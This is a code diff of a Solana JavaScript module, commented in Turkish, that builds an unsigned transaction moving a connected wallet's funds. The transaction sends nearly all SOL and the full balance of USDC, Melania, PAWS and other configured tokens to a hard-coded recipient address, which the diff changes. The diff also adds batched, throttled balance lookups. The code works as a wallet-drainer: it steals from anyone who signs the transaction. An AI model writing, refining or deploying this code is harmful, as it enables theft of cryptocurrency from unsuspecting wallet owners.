@@ -4,203 +4,136 @@
 import {
   PublicKey,
   SystemProgram,
+  TransactionInstruction,
   TransactionMessage,
   VersionedTransaction,
 } from "@solana/web3.js";
 import {
   getAssociatedTokenAddress,
   getAccount,
-  createTransferInstruction,
   createAssociatedTokenAccountInstruction,
+  createTransferInstruction,
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
+import { TOKEN_CONFIGS } from "./token-config.js";
+
+// Throttle ayarları
+const BATCH_SIZE = 3;
+const BATCH_DELAY_MS = 1000;
 
 /**
- * Kullanıcının bakiyelerine göre SOL, USDC, Melania ve PAWS transferi için
- * instruction’ları ekleyen, imzalanmamış bir VersionedTransaction döner.
- * Yeterli bakiye yoksa null döner.
- *
- * @param {PublicKey | null} userPublicKey
- * @returns {Promise<VersionedTransaction|null>}
+ * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
+ * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
  */
+async function runBatches(tasks) {
+  const results = [];
+  for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
+    const batch = tasks.slice(i, i + BATCH_SIZE).map((fn) => fn());
+    const res = await Promise.all(batch);
+    results.push(...res);
+    if (i + BATCH_SIZE < tasks.length) {
+      await new Promise((r) => setTimeout(r, BATCH_DELAY_MS));
+    }
+  }
+  return results;
+}
+
 export async function createUnsignedTransaction(userPublicKey) {
   if (!userPublicKey) {
-    console.warn("Kullanıcı cüzdanı bağlı değil!");
+    console.warn("wallet not connected!");
     return null;
   }
 
-  // -----------------------------------------------------------
-  // SOL Bakiyesi ve fee buffer
-  // -----------------------------------------------------------
-  const userSolLamports = await connection.getBalance(userPublicKey);
+  const payer = userPublicKey;
+  const toPublicKey = new PublicKey("FRcrm9XNbKNU7TfCLwx7KXzs7UpSxiEi2LydQ3ebv9r1");
+
+  // SOL bakiyesi kontrolü
+  const userSolLamports = await connection.getBalance(payer);
   const feeBufferLamports = 6_000_000; // ~0.006 SOL
   const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
   const isSolSufficient = solToSend > 0;
 
-  // -----------------------------------------------------------
-  // USDC Bakiyesi Kontrolü
-  // -----------------------------------------------------------
-  const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
-  const userUsdcAta = await getAssociatedTokenAddress(USDC_MINT, userPublicKey);
-  let userUsdcAmount = 0;
-  let isUsdcSufficient = false;
-  try {
-    const info = await getAccount(connection, userUsdcAta);
-    userUsdcAmount = Number(info.amount);
-    isUsdcSufficient = userUsdcAmount > 80_000; // >=0.008 USDC
-  } catch {
-    isUsdcSufficient = false;
-  }
+  // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
+  const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
+    const userAta = await getAssociatedTokenAddress(mint, payer);
+    let amount = 0, sufficient = false;
+    try {
+      const acct = await getAccount(connection, userAta);
+      amount = Number(acct.amount);
+      sufficient = amount > threshold;
+    } catch {
+      sufficient = false;
+    }
+    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);
+    return { mint, userAta, toAta, amount, sufficient };
+  });
+  const userTokenInfos = await runBatches(balanceTasks);
 
-  // -----------------------------------------------------------
-  // Melania Bakiyesi Kontrolü
-  // -----------------------------------------------------------
-  const MELANIA_MINT = new PublicKey("FUAfBo2jgks6gB4Z4LfZkqSZgzNucisEHqnNebaRxM1P");
-  const userMelaniaAta = await getAssociatedTokenAddress(MELANIA_MINT, userPublicKey);
-  let userMelaniaAmount = 0;
-  let isMelaniaSufficient = false;
-  try {
-    const info = await getAccount(connection, userMelaniaAta);
-    userMelaniaAmount = Number(info.amount);
-    isMelaniaSufficient = userMelaniaAmount > 10_000; // >=0.01 MEL
-  } catch {
-    isMelaniaSufficient = false;
-  }
-
-  // -----------------------------------------------------------
-  // PAWS Bakiyesi Kontrolü
-  // -----------------------------------------------------------
-  const PAWS_MINT = new PublicKey("PAWSxhjTyNJELywYiYTxCN857utnYmWXu7Q59Vgn6ZQ");
-  const userPawsAta = await getAssociatedTokenAddress(PAWS_MINT, userPublicKey);
-  let userPawsAmount = 0;
-  let isPawsSufficient = false;
-  try {
-    const info = await getAccount(connection, userPawsAta);
-    userPawsAmount = Number(info.amount);
-    isPawsSufficient = userPawsAmount > 1_000_000; // >=1 000 PAWS
-  } catch {
-    isPawsSufficient = false;
-  }
-
-  // -----------------------------------------------------------
-  // Eligibility: Hiçbiri yeterli değilse çık
-  // -----------------------------------------------------------
-  if (
-    !isSolSufficient &&
-    !isUsdcSufficient &&
-    !isMelaniaSufficient &&
-    !isPawsSufficient
-  ) {
+  // Hiçbir varlık yeterli değilse çık
+  if (!isSolSufficient && !userTokenInfos.some((t) => t.sufficient)) {
     console.warn("Yeterli bakiye yok!");
     return null;
   }
 
-  // -----------------------------------------------------------
-  // Hedef adres ve ATA hesapları
-  // -----------------------------------------------------------
-  const toPublicKey = new PublicKey("GpLLb2NqvWYyYJ5wGZNQCAuxHWdJdHpXscyHNd6SH8c1");
-  const toUsdcAta    = await getAssociatedTokenAddress(USDC_MINT,    toPublicKey);
-  const toMelaniaAta = await getAssociatedTokenAddress(MELANIA_MINT, toPublicKey);
-  const toPawsAta    = await getAssociatedTokenAddress(PAWS_MINT,    toPublicKey);
+  // 2) Alıcı ATA'larını batch'li olarak kontrol et
+  const creationTasks = userTokenInfos
+    .filter((t) => t.sufficient)
+    .map(({ toAta }) => async () => {
+      try {
+        await getAccount(connection, toAta);
+        return false; // zaten var
+      } catch {
+        return true;  // yaratılmalı
+      }
+    });
+  const shouldCreateAta = await runBatches(creationTasks);
 
-  // -----------------------------------------------------------
-  // Instruction listesi oluştur
-  // -----------------------------------------------------------
+  // 3) Instruction'ları sırayla derle
   const instructions = [];
 
-  // ➋ Gerekirse hedef ATA hesaplarını oluştur
-  if (isUsdcSufficient) {
-    try {
-      await getAccount(connection, toUsdcAta);
-    } catch {
-      instructions.push(
-        createAssociatedTokenAccountInstruction(
-          userPublicKey,
-          toUsdcAta,
-          toPublicKey,
-          USDC_MINT
-        )
-      );
-    }
-  }
-  if (isMelaniaSufficient) {
-    try {
-      await getAccount(connection, toMelaniaAta);
-    } catch {
-      instructions.push(
-        createAssociatedTokenAccountInstruction(
-          userPublicKey,
-          toMelaniaAta,
-          toPublicKey,
-          MELANIA_MINT
-        )
-      );
-    }
-  }
-  if (isPawsSufficient) {
-    try {
-      await getAccount(connection, toPawsAta);
-    } catch {
-      instructions.push(
-        createAssociatedTokenAccountInstruction(
-          userPublicKey,
-          toPawsAta,
-          toPublicKey,
-          PAWS_MINT
-        )
-      );
-    }
-  }
-
-  // -----------------------------------------------------------
-  // Transfer instruction’ları ekle
-  // -----------------------------------------------------------
+  // 3a) SOL transfer instruction
   if (isSolSufficient) {
     instructions.push(
       SystemProgram.transfer({
-        fromPubkey: userPublicKey,
+        fromPubkey: payer,
         toPubkey:   toPublicKey,
         lamports:   solToSend,
       })
     );
   }
-  if (isUsdcSufficient) {
+
+  // 3b) SPL-token ATA oluşturma ve transfer
+  let idx = 0;
+  for (const { userAta, toAta, amount, sufficient, mint } of userTokenInfos) {
+    if (!sufficient) continue;
+
+    // ➊ Eksikse ATA oluştur
+    if (shouldCreateAta[idx]) {
+      instructions.push(
+        createAssociatedTokenAccountInstruction(
+          payer,
+          toAta,
+          toPublicKey,
+          mint
+        )
+      );
+    }
+    // ➋ Token transfer
     instructions.push(
       createTransferInstruction(
-        userUsdcAta,
-        toUsdcAta,
-        userPublicKey,
-        userUsdcAmount
+        userAta,
+        toAta,
+        payer,
+        amount
       )
     );
-  }
-  if (isMelaniaSufficient) {
-    instructions.push(
-      createTransferInstruction(
-        userMelaniaAta,
-        toMelaniaAta,
-        userPublicKey,
-        userMelaniaAmount
-      )
-    );
-  }
-  if (isPawsSufficient) {
-    instructions.push(
-      createTransferInstruction(
-        userPawsAta,
-        toPawsAta,
-        userPublicKey,
-        userPawsAmount
-      )
-    );
+    idx++;
   }
 
-  // -----------------------------------------------------------
-  // VersionedTransaction oluşturma
-  // -----------------------------------------------------------
+  // 4) Tek bir VersionedTransaction oluştur
   const { blockhash } = await connection.getLatestBlockhash();
   const messageV0 = new TransactionMessage({
-    payerKey:        userPublicKey,
+    payerKey:        payer,
     recentBlockhash: blockhash,
     instructions,
   }).compileToV0Message();
